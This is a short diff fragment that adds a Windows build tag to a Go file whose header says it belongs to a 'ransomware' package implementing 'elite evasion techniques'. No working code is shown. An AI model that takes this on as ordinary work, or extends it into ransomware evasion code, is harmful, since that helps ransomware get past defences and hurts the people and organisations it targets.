@@ -1,3 +1,5 @@
+//go:build windows
+
 // Package ransomware — elite evasion techniques (gaps #56-#70).
 //
 // Implements the final 15 techniques that separate a good framework
